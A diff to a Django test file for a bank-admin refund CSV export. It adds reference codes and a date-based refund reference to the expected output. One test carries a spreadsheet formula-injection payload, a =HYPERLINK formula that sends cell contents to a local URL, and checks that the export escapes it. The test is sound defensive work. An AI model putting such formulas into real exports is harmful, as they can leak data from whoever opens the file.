@@ -1,7 +1,7 @@
+from datetime import date
 from unittest import mock
 
 from django.test import SimpleTestCase
-from django.conf import settings
 
 from . import NO_TRANSACTIONS
 from .. import refund, ACCESSPAY_LABEL
@@ -16,6 +16,7 @@ REFUND_TRANSACTIONS = [
             'sender_account_number': '22222222',
             'sender_sort_code': '111111',
             'sender_name': 'John Doe',
+            'ref_code': '900001',
             'reference': 'for birthday',
             'credited': False,
             'refunded': False
@@ -29,12 +30,17 @@ REFUND_TRANSACTIONS = [
             'sender_account_number': '33333333',
             'sender_sort_code': '999999',
             'sender_name': 'Joe Bloggs',
+            'ref_code': '900002',
             'reference': 'A1234 22/03/66',
             'credited': False,
             'refunded': False
         }]
     },
 ]
+
+
+def get_base_ref():
+    return date.today().strftime('Refund %d%m_')
 
 
 @mock.patch('mtp_bank_admin.apps.bank_admin.refund.api_client')
@@ -56,10 +62,12 @@ class ValidTransactionsTestCase(SimpleTestCase):
         batch_conn.post.assert_called_once_with(
             {'label': ACCESSPAY_LABEL, 'transactions': ['3', '4']}
         )
+
         self.assertEqual(
-            ('111111,22222222,John Doe,25.68,%(ref)s\r\n' +
-             '999999,33333333,Joe Bloggs,18.72,%(ref)s\r\n')
-            % {'ref': settings.REFUND_REFERENCE},
+            ('111111,22222222,John Doe,25.68,%(ref_a)s\r\n' +
+             '999999,33333333,Joe Bloggs,18.72,%(ref_b)s\r\n')
+            % {'ref_a': get_base_ref() + '00001',
+               'ref_b': get_base_ref() + '00002'},
             csvdata)
 
     def test_generate_previous_refund_file(self, mock_api_client, mock_refund_api_client):
@@ -78,9 +86,10 @@ class ValidTransactionsTestCase(SimpleTestCase):
         self.assertFalse(batch_conn.post.called)
 
         self.assertEqual(
-            ('111111,22222222,John Doe,25.68,%(ref)s\r\n' +
-             '999999,33333333,Joe Bloggs,18.72,%(ref)s\r\n')
-            % {'ref': settings.REFUND_REFERENCE},
+            ('111111,22222222,John Doe,25.68,%(ref_a)s\r\n' +
+             '999999,33333333,Joe Bloggs,18.72,%(ref_b)s\r\n')
+            % {'ref_a': get_base_ref() + '00001',
+               'ref_b': get_base_ref() + '00002'},
             csvdata)
 
     def test_escaping_formulae_in_csv_export(self, mock_api_client, mock_refund_api_client):
@@ -95,6 +104,7 @@ class ValidTransactionsTestCase(SimpleTestCase):
                     'sender_sort_code': '111111',
                     'sender_name': '=HYPERLINK("http://127.0.0.1/?value="&A1&A1, '
                                    '"Error: please click for further information")',
+                    'ref_code': '900001',
                     'reference': 'for birthday',
                     'credited': False,
                     'refunded': False
@@ -104,6 +114,7 @@ class ValidTransactionsTestCase(SimpleTestCase):
                     'amount': 1872,
                     'sender_account_number': '33333333',
                     'sender_sort_code': '999999',
+                    'ref_code': '900002',
                     'sender_name': '=1+2',
                     'reference': 'A1234 22/03/66',
                     'credited': False,
@@ -116,9 +127,10 @@ class ValidTransactionsTestCase(SimpleTestCase):
 
         self.assertEqual(
             ('''111111,22222222,"'=HYPERLINK(""http://127.0.0.1/?value=""&A1&A1, ''' +
-             '''""Error: please click for further information"")",25.68,%(ref)s\r\n''' +
-             '''999999,33333333,'=1+2,18.72,%(ref)s\r\n''')
-            % {'ref': settings.REFUND_REFERENCE},
+             '''""Error: please click for further information"")",25.68,%(ref_a)s\r\n''' +
+             '''999999,33333333,'=1+2,18.72,%(ref_b)s\r\n''')
+            % {'ref_a': get_base_ref() + '00001',
+               'ref_b': get_base_ref() + '00002'},
             csvdata)
 
 
